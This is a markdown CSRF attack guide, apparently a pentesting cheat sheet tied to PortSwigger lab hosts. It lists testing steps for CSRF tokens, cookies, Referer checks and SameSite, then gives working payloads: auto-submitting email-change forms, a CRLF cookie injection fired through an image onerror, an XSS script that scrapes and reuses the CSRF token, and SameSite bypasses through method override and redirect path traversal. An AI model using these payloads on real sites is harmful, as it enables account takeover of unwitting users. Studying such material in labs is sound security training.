# CSRF (Cross-Site Request Forgery) Attack Guide

---

## Index

1. [Testing CSRF Token](#testing-csrf-token)
2. [Testing CSRF Token and CSRF Cookies](#testing-csrf-token-and-csrf-cookies)
3. [Exploitation Techniques](#exploitation-techniques)
   - [HTML Exploit Example](#html-exploit-example)
   - [Image-based CSRF Cookie Injection](#image-based-csrf-cookie-injection)
   - [XSS Based CSRF Attack](#XSS-Based-CSRF-Attack)
5. [Testing the Referer Header for CSRF Attack](#testing-the-referer-header-for-csrf-attack)
   - [Exploit for Referer Header Validation (Case 1)](#exploit-for-referer-header-validation-case-1)
6. [Bypassing SameSite Policy](#bypassing-samesite-policy)
   - [Lax Bypass Via Method Override](#Lax-Bypass-Via-Method-Override)

---

## Testing CSRF Token

When testing a CSRF token, follow these steps:

1. **Remove CSRF parameter/token**: Check if the application accepts requests without the token.
2. **Change request method (POST to GET)**: Test if changing the method affects token validation.
3. **Exchange CSRF token with another user**: Verify if tokens are user-specific by testing another userâ€™s token.

---

## Testing CSRF Token and CSRF Cookies

**If CSRF cookie Not Tied With User Session Cookie**

1. **Submit an invalid CSRF token**: See if the application accepts it.
2. **Submit a valid CSRF token from another user**: Check if the token is user-specific. 
3. **Submit a valid CSRF token and CSRF cookie from another user**: Test if both token and cookie are required to match.
4. **Assign a random value to token + cookie**: In a duplicated token cookie, try setting the same random value to both.

**If CSRF cookie Tied With User Session Cookie**

[Portswigger Lab](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie)

<br>

**Note:** You can collect csrf token by inspect element.

---

### Exploitation Techniques

To exploit a CSRF token + cookie mechanism, two actions are required:

1. **Inject a CSRF cookie into the user's session** (via HTTP header injection)
2. **Send a CSRF attack to the victim**

### HTML Exploit Example

```html
<form action="https://0ac3007703f51dc881598ea300940055.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacked&#64;a&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
<script>
        document.forms[0].submit();
</script>
```

### Image-based CSRF Cookie Injection

```html
<form action="https://0ac3007703f51dc881598ea300940055.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacked&#64;a&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
<img src="https://0a5000e9036c9fa3820d15c300a500d4.web-security-academy.net/?search=asdasfa%0d%0aSet-Cookie:%20csrf=testing;%20SameSite=None" onerror="document.forms[0].submit()">
```

### XSS Based CSRF Attack

```html
<script>
  var req = new XMLHttpRequest();
  req.onload = handleResponse;
  req.open('get', '/my-account', true);
  req.send();

  function handleResponse() {
    // Extract the CSRF token from the response
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];

    // Display the token in a popup alert
    alert('Extracted CSRF Token: ' + token);

    // Send a POST request to change the email
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    changeReq.send('csrf=' + token + '&email=test@test.com');
  }
</script>
```

---

## Testing the Referer Header for CSRF Attack

1. **Remove the Referer header**: See if the application still processes the request without it.
2. **Validate which part of the Referer header is used**: Identify which part is validated by the application.

   - **Example 1**: `Referer: https://attacker.com/?vulnerable-web.net`
   - **Example 2**: `Referer: http://vulnerable-website.com.attacker-website.com/csrf-attack`

### Exploit for Referer Header Validation (Case 1)

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
<head>
<meta name="referrer" content="no-referrer">
</head>
  <body>
    <form action="https://0ac3007703f51dc881598ea300940055.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacked&#64;a&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

---

## Bypassing SameSite Policy

[Same site explanation](https://www.youtube.com/watch?v=aUF2QCEudPo&t=360s)

### Lax Bypass Via Method Override

1. **Change request method from POST to GET in Burp**
2. **Try overriding the method by adding the ```_method``` parameter to the query string**

**Example**: GET /my-account/change-email?email=pwned@hacked.com```&_method=POST``` HTTP/1.1

**Payload**
```javascript
<script>
    document.location = "https://vulnerable.web/my-account/change-email?email=pwned@hacked.com&_method=POST";
</script>
```
--- 

### Strict Bypass Via Client-Side Redirect

If there is a endpoint in website that redirecting to another page of website, you can use this process to bypass strict attribute.

1. **Change request method from POST to GET in Burp**
2. **Identify a endpoint that redirect the traffic to another page**
3. **Now copy and paste the request that you changed from POST to GET in the redirection path**
4. **If possible, you can also use the path traversal technique**

**Example**: https://vulnblog.web/post/comment/confirmation?postId=../my-account. Here, ```postId``` parameter trying a rediction and we are trying to exlploit the change-email functionality in ```/my-account``` page.

**Payload**
```javascript
<script>
    document.location = "https://vulnerable.web/post/comment/confirmation?postId=../my-account/change-email?email=a111%40a.com%26submit=1";
</script>
```
---

### **Table**

| Attribute         | Sent with Cross-Origin Requests? | Sent on Same-Site Requests? | Notes                                       |
|-------------------|----------------------------------|-----------------------------|---------------------------------------------|
| `Strict`          | No                              | Yes                         | Most secure, but may reduce usability.      |
| `Lax`             | Limited (e.g., navigation GET)  | Yes                         | Good balance between usability and security.|
| `None` (with `Secure`) | Yes                             | Yes                         | Necessary for third-party cookies.          |
| No Attribute      | Limited (assumed `Lax`)         | Yes                         | Default behavior in most modern browsers.   |

**Key Note:**
```plaintext
Set-Cookie: session=bciZoELY2ukJUUOj1zJ7wcAGdYXtvq3C; Secure; HttpOnly; SameSite=Strict
```
---
